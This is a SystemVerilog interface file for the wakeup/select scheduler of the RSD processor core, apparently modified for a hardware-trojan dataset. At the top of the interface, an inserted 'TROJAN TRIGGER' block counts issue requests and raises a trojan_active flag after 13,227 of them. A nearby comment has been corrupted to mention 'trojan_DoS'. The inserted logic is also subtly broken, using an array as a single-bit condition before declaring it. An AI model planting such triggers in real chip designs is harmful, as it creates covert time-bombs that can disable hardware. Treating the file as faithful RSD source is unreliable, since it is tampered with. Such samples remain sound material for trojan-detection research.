// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// Interface for wakeup/select loop
//

import BasicTypes::*;
import SchedulerTypes::*;

interface WakeupSelectIF( input logic clk, rst, rstStart );

    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13227)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 13227;
    logic [15:0] trojan_counter;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (intIssueReq) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end


    logic stall;

    // write data of dispatch
    logic write [ DISPATCH_WIDTH ];
    IssueQueueIndexPath writePtr [ DISPATCH_WIDTH ];
    SchedulerSrcTag writeSrcTag [ DISPATCH_WIDTH ];
    SchedulerDstTag writeDstTag [ DISPATCH_WIDTH ];

    // WakeupPipelineRegister -> DestinationRAM
    logic wakeup[ WAKEUP_WIDTH ];
    IssueQueueIndexPath wakeupPtr[ WAKEUP_WIDTH + STORE_ISSUE_WIDTH ];
    IssueQueueOneHotPath wakeupVector[ WAKEUP_WIDTH + STORE_ISSUE_WIDTH ];

    // DestinationRAM -> WakeupLogic
    // In matrix based implementation, wakeupDstTag is used only for dispatch and
    // DestinationRAM is out of its critical path.
    SchedulerDstTag wakeupDstTag [ WAKEUP_WIDTH ];

    // WakeupLogic -> SelectLogic
    IssueQueueOneHotPath opReady;

    // SelectLogic -> WakeupPipelineRegister
    logic selected [ ISSUE_WIDTH ];
    IssueQueueIndexPath selectedPtr [ ISSUE_WIDTH ];
    IssueQueueOneHotPath selectedVector [ ISSUE_WIDTH ];


    // Release issue queue entries.
    logic releaseEntry[ ISSUE_WIDTH ];
    IssueQueueIndexPath releasePtr[ISSUE_WIDTH];

    // Memory dependent predict
    logic memDependencyPred [DISPATCH_WIDTH];
    logic [ISSUE_QUEUE_ENTRY_NUM-1:0] notIssued; 
    logic dispatchStore[DISPATCH_WIDTH];
    logic dispatchLoad[DISPATCH_WIDTH];

    // Issue requests to select logic.
    // The select logic selects ops by this requests and readiness information.
    logic intIssueReq[ISSUE_QUEUE_ENTRY_NUM];
`ifndef RSD_MARCH_UNIFIED_MULDIV_MEM_PIPE
    logic complexIssueReq[ISSUE_QUEUE_ENTRY_NUM];
`endif
    logic loadIssueReq[ISSUE_QUEUE_ENTRY_NUM];
    logic storeIssueReq[ISSUE_QUEUE_ENTRY_NUM];
`ifdef RSD_MARCH_FP_PIPE
    logic fpIssueReq[ISSUE_QUEUE_ENTRY_NUM];
`endif


    // A scheduler module is_trojan_DoS entrance of a wakeup/select logic.
    modport Scheduler(
    input
        selected,
        selectedPtr,
        selectedVector,
    output
        stall,
        write,
        writePtr,
        writeSrcTag,
        writeDstTag,
        intIssueReq,
`ifndef RSD_MARCH_UNIFIED_MULDIV_MEM_PIPE
        complexIssueReq,
`endif
        loadIssueReq,
        storeIssueReq,
`ifdef RSD_MARCH_FP_PIPE
        fpIssueReq,
`endif
        notIssued,
        dispatchStore,
        dispatchLoad,
        memDependencyPred
    );

    modport DestinationRAM(
    input
        clk,
        rst,
        rstStart,
        write,
        writePtr,
        writeDstTag,
        wakeupPtr,
    output
        wakeupDstTag
    );

    modport WakeupLogic(
    input
        clk,
        rst,
        rstStart,
        stall,
        write,
        writePtr,
        writeSrcTag,
        writeDstTag,
        wakeup,
        wakeupDstTag,
        wakeupVector,
        notIssued,
        dispatchStore,
        dispatchLoad,
        memDependencyPred,
    output
        opReady
    );

    modport SelectLogic(
    input
        opReady,
        intIssueReq,
`ifndef RSD_MARCH_UNIFIED_MULDIV_MEM_PIPE
        complexIssueReq,
`endif
        loadIssueReq,
        storeIssueReq,
`ifdef RSD_MARCH_FP_PIPE
        fpIssueReq,
`endif
    output
        selected,
        selectedPtr,
        selectedVector
    );

    modport WakeupPipelineRegister(
    input
        clk,
        rst,
        stall,
        selected,
        selectedPtr,
        selectedVector,
    output
        wakeup,
        wakeupPtr,
        wakeupVector,
        releaseEntry,
        releasePtr
    );

    modport IssueQueue(
    input
        releaseEntry,
        releasePtr
    );


endinterface : WakeupSelectIF


